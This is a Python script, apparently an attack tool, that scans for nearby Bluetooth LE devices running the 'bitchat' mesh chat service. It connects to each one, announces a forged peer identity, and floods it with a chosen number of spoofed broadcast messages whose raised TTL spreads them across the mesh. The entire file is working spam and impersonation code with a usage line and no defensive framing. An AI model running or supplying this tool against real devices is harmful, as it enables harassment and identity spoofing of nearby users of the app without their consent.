#!/usr/bin/env python3
from bleak import BleakScanner, BleakClient
import asyncio
import sys
import time
import struct
import uuid

def generate_announce_packet(sender_id, sender_name, ttl=3):
    announce_packet = bytes()
    announce_packet += bytes.fromhex("0101")
    announce_packet += struct.pack('>B', ttl)
    announce_packet += struct.pack('>Q', int(time.time()) * 1000)
    announce_packet += bytes.fromhex("00")
    announce_packet += struct.pack('>H', len(sender_name))
    announce_packet += sender_id
    announce_packet += sender_name
    return announce_packet

def generate_message_packet(sender_id, sender_name, content, ttl=3):
    message = bytes()
    message += bytes.fromhex("10") # setting senderPeerID flag
    message += struct.pack('>Q', int(time.time()) * 1000)
    uid = str(uuid.uuid4()).encode("utf-8")
    message += struct.pack('>B', len(uid))
    message += uid
    message += struct.pack('>B', len(sender_name))
    message += sender_name
    message += struct.pack('>H', len(content))
    message += content
    message += struct.pack('>B', len(sender_id))
    message += sender_id
    
    message_packet = bytes()
    message_packet += bytes.fromhex("0104")
    message_packet += struct.pack('>B', ttl)
    message_packet += struct.pack('>Q', int(time.time()) * 1000)
    message_packet += bytes.fromhex("01")
    message_packet += struct.pack('>H', len(message))
    message_packet += sender_id
    message_packet += bytes.fromhex("ffffffffffffffff")
    message_packet += message
    return message_packet


bitchat_service_uuid = ["F47B5E2D-4A9E-4C5A-9B3F-8E1D2C3A4B5C",]
bitchat_char_uuid = "A1B2C3D4-E5F6-4A5B-8C9D-0E1F2A3B4C5D"
sender_id = b"deadbeef"

async def bcspam(num_messages, sender_name, message):

    devices = await BleakScanner.discover(
        return_adv=True,
        service_uuids=bitchat_service_uuid,
    )
    
    for d, a in devices.values():

        try:
            async with BleakClient(d.address, timeout=2) as client:
                bitchat_device = False
                for service in client.services:
                    for char in service.characteristics:
                        if str(char.uuid).upper() == bitchat_char_uuid:
                            bitchat_device = True

                if bitchat_device:
                    print(f"found bitchat device: {d.address} Sending Messages...")
                    announce_packet = generate_announce_packet(sender_id,sender_name)
                    await client.write_gatt_char(bitchat_char_uuid, announce_packet, response=False)
                    await asyncio.sleep(0.5)

                    for i in range(num_messages):
                        message_packet = generate_message_packet(sender_id, sender_name, message, ttl=5)
                        await client.write_gatt_char(bitchat_char_uuid, message_packet, response=False)
                        await asyncio.sleep(0.5)
        except:
            continue
            
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python {sys.argv[0]} <num_messages> <sender_name> <message>")
        sys.exit(1)
    try:
        num_messages = int(sys.argv[1])
        sender_name = sys.argv[2].encode("utf-8")
        message = sys.argv[3].encode("utf-8")
    except:
        print("Error: First argument must be a valid integer")
        sys.exit(1)

    asyncio.run(bcspam(num_messages,sender_name,message))
